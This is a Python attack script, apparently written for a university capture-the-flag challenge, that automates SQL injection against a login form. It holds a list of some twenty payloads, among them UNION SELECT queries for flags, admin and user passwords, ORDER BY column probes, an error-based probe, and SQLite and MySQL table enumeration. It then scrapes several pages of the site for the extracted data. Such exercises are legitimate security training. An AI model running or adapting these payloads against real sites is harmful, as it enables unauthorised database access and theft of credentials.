#!/usr/bin/env python3
"""
UNION-based SQL Injection to extract flag directly from database
"""

import requests
import re

BASE_URL = "http://challenges.iik3100-h25.iaas.iik.ntnu.no:11080"

def test_union_payload(payload, description):
    """Test UNION-based SQL injection payload."""
    session = requests.Session()
    data = {'username': payload}
    
    # Login with SQL injection
    response = session.post(f"{BASE_URL}/login", data=data, allow_redirects=True)
    
    # Check all pages for the flag
    pages = [
        ('/', 'Homepage'),
        ('/profile', 'Profile'),
        ('/admin', 'Admin'),
    ]
    
    all_flags = []
    for endpoint, page_name in pages:
        try:
            resp = session.get(f"{BASE_URL}{endpoint}")
            flags = re.findall(r'CTF\{[^}]+\}', resp.text)
            
            # Also look for any interesting data that might be the flag
            interesting = re.findall(r'flag\{[^}]+\}', resp.text, re.IGNORECASE)
            flags.extend(interesting)
            
            if flags:
                unique_flags = [f for f in flags if 'not_the_real' not in f and 'admin_panel_is_bait' not in f]
                if unique_flags:
                    print(f"\n[+] {description}")
                    print(f"    Payload: {payload}")
                    print(f"    Found in: {page_name}")
                    for flag in unique_flags:
                        print(f"    🚩 {flag}")
                        all_flags.append(flag)
        except Exception:
            pass
    
    return all_flags


def main():
    print("="*70)
    print("UNION-BASED SQL INJECTION - DIRECT FLAG EXTRACTION")
    print("="*70)
    print()
    
    #Try to figure out number of columns first
    print("[*] Testing UNION SELECT to extract flag from database...")
    print()
    
    # UNION injection payloads to extract data
    payloads = [
        # Try different column counts
        ("UNION 1 column", "' UNION SELECT flag FROM flags--"),
        ("UNION 1 column (password)", "' UNION SELECT password FROM users WHERE username='admin'--"),
        ("UNION 1 column (all from flags)", "' UNION SELECT * FROM flags--"),
        
        # Try 2 columns
        ("UNION 2 columns", "' UNION SELECT NULL, flag FROM flags--"),
        ("UNION 2 columns reverse", "' UNION SELECT flag, NULL FROM flags--"),
        ("UNION 2 columns both", "' UNION SELECT flag, flag FROM flags--"),
        
        # Try 3 columns
        ("UNION 3 columns", "' UNION SELECT NULL, NULL, flag FROM flags--"),
        ("UNION 3 columns mid", "' UNION SELECT NULL, flag, NULL FROM flags--"),
        ("UNION 3 columns first", "' UNION SELECT flag, NULL, NULL FROM flags--"),
        
        # Try common table/column names
        ("Extract from flag table", "' UNION SELECT value FROM flag--"),
        ("Extract from secret table", "' UNION SELECT secret FROM secrets--"),
        ("Extract admin password", "' UNION SELECT password FROM admin--"),
        
        # Try with ORDER BY to find column count first
        ("Order by test 1", "' ORDER BY 1--"),
        ("Order by test 2", "' ORDER BY 2--"),
        ("Order by test 3", "' ORDER BY 3--"),
        
        # Blind injection - maybe it shows in error messages
        ("Error-based", "' AND 1=CONVERT(int, (SELECT flag FROM flags))--"),
        
        # Try substring extraction
        ("Substring extraction", "' UNION SELECT SUBSTRING(flag,1,50) FROM flags--"),
        
        # Try to list all tables
        ("List tables SQLite", "' UNION SELECT name FROM sqlite_master WHERE type='table'--"),
        ("List tables MySQL", "' UNION SELECT table_name FROM information_schema.tables--"),
        
        # Group concat to get all at once
        ("Group concat MySQL", "' UNION SELECT GROUP_CONCAT(flag) FROM flags--"),
       
        # Try accessing users table
        ("All users", "' UNION SELECT username FROM users--"),
        ("User passwords", "' UNION SELECT password FROM users--"),
    ]
    
    all_flags = []
    for desc, payload in payloads:
        flags = test_union_payload(payload, desc)
        all_flags.extend(flags)
    
    print("\n" + "="*70)
    print("FINAL RESULTS")
    print("="*70)
    
    if all_flags:
        unique = list(set(all_flags))
        print(f"\n[+] Found {len(unique)} unique real flags:")
        for flag in unique:
            print(f"    🚩 {flag}")
    else:
        print("\n[-] No real flags extracted via UNION injection")
        print("\n[*] The application might be:")
        print("    - Using prepared statements (no SQL injection)")
        print("    - Flag accessible only through admin panel with proper auth")
        print("    - Requires a different exploitation technique")


if __name__ == "__main__":
    main()
